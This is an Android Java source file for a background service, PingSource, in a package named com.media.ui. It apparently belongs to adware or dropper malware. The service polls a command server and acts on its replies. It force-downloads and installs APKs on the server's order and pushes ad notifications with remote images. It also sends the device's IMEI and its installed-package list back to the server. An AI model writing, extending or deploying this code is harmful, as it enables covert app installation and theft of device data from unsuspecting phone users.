package com.media.ui;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import static com.media.ui.CnfInstall.pakage;
import static com.media.ui.GetIMEI.imi;
import static com.media.ui.Logger.logg;
import static com.media.ui.PollRes.poll;
import static com.media.ui.conf.AppFolder;
import static com.media.ui.conf.SERVER;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class PingSource extends IntentService {

    private String server = SERVER;
    Map<String, String> vals = new HashMap<String, String>();

    private static final String MyPREFERENCES = "alprefs";
    private SharedPreferences sharedPref;
    private SharedPreferences sharedpreferences;

    // Context mcontext;
    public PingSource() {

        super("PingSource");
    }

    public void onCreate() {
        super.onCreate();
        // this gets called properly
        sharedPref = this.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
        logg("Service onCreate()");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        String camp_id = "";
        logg("Service Started!");
        try {
            if (intent != null) {
                PingServer ping = new PingServer(this);
                try {
                    vals = ping.StartPoll(server, "polling");
                } catch (Exception e) {
                    e.printStackTrace();
                }
                String stat = vals.get("stat");
                logg("str:" + vals.toString());
                if (stat.equals("polling")) {
                    logg("Polling Complete");
                    SharedPreferences.Editor editor = sharedPref.edit();
                    editor.putInt("flag", 0);
                    editor.apply();
                } else if (stat.equals("forceins")) {
                    logg("Polling Complete");
                    String ur = vals.get("data");
                    camp_id = vals.get("ic");
                    String pkg = vals.get("pkg");

                    DownloadFile dl = new DownloadFile();
                    if (dl.DownloadFiles(ur)) {
                        InstallApp ins = new InstallApp(this);
                        String dir = Environment.getExternalStorageDirectory().toString();
                        String loc = dir + ("/" + AppFolder + "/app.apk");
                        logg("pkg: " + pkg);
                        if (ins.install(loc, pkg)) {
                            logg("Install Complete");
                            dl.deleteDir();
                            sharedpreferences = getSharedPreferences(pakage, Context.MODE_PRIVATE);
                            SharedPreferences.Editor editor = sharedpreferences.edit();
                            editor.putString("pkg", pkg);
                            editor.putString("camp_id", camp_id);
                            editor.putString("ins_type", "frcins");
                            editor.commit();

                        } else {
                            if (poll(server, "Inf", imi(this), camp_id)) {
                                logg("Ack Complete");
                            }
                            dl.deleteDir();
                            logg("install failed");
                        }
                    } else {
                        if (poll(server, "Indf", imi(this), camp_id)) {
                            logg("Ack Complete");
                        }
                        logg("download failed");
                        dl.deleteDir();
                    }
                } else if (stat.equals("askins")) {

                    String header = "";
                    String desc = "";
                    String Appicon = "";
                    Bitmap myBitmap = null;
                    logg("Notification");
                    String noti_json = vals.get("data");
                    try {
                        JSONObject reader = new JSONObject(noti_json);
                        camp_id = reader.getString("camp_id");
                        header = reader.getString("heading");
                        desc = reader.getString("desc");
                        Appicon = reader.getString("Apk_Icon");

                        URL url = new URL(Appicon);
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setDoInput(true);
                        connection.connect();
                        InputStream in = connection.getInputStream();
                        myBitmap = BitmapFactory.decodeStream(in);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    } catch (MalformedURLException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    Noti n = new Noti(this);

                    n.addNotification(header, desc, camp_id, myBitmap);
                    poll(SERVER, "NotiReceived", imi(this), camp_id);
                } else if (stat.equals("noti")) {
                    String header = "";
                    String desc = "";
                    Bitmap AppIcon = null;
                    Bitmap Banner = null;
                    String NotiType = "";
                    String Noti_Intent = "";
                    String noti_json = vals.get("data");
                    try {
                        JSONObject reader = new JSONObject(noti_json);
                        camp_id = reader.getString("camp_id");
                        header = reader.getString("heading");
                        desc = reader.getString("desc");
                        NotiType = reader.getString("Noti_type");
                        Noti_Intent = reader.getString("Noti_Intent");
                        String Appicon = reader.getString("Noti_Icon");
                        String ban = reader.getString("Noti_Banner");

                        URL url = new URL(Appicon);
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setDoInput(true);
                        connection.connect();
                        InputStream in = connection.getInputStream();
                        AppIcon = BitmapFactory.decodeStream(in);
                        if (NotiType.equals("banner")) {
                            url = new URL(ban);
                            connection = (HttpURLConnection) url.openConnection();
                            connection.setDoInput(true);
                            connection.connect();
                            in = connection.getInputStream();
                            Banner = BitmapFactory.decodeStream(in);
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    } catch (MalformedURLException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    MultiNotification n = new MultiNotification(this);
                    n.setHeading(header);
                    n.setDesc(desc);
                    n.setIcon(AppIcon);
                    n.setIntent(Noti_Intent);
                    n.NotiType(NotiType);
                    if (NotiType.equals("banner")) {
                        n.setBanner(Banner);
                    }
                    n.setCamp_id(camp_id);
                    n.CreateNoti();
                    poll(SERVER, "NotiReceived", imi(this), camp_id);
                    logg("noti");
                } else if (stat.equals("conf")) {
                    logg("conf");
                } else if (stat.equals("execcmd")) {
                    PackageList p = new PackageList(this);
                    try {
                        String pr = p.getPkglist();
                        String dt = vals.get("data");
                        JSONObject reader = new JSONObject(dt);
                        camp_id = reader.getString("camp_id");
                        poll(SERVER, "pkgs|" + pr, imi(this), camp_id);
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    logg("cmd");
                } else {
                    logg("nothing");
                }
                logg("Finish");
                stopSelf();
                final String action = intent.getAction();

            }
        } catch (Exception e) {

        } finally {
        }

    }
}
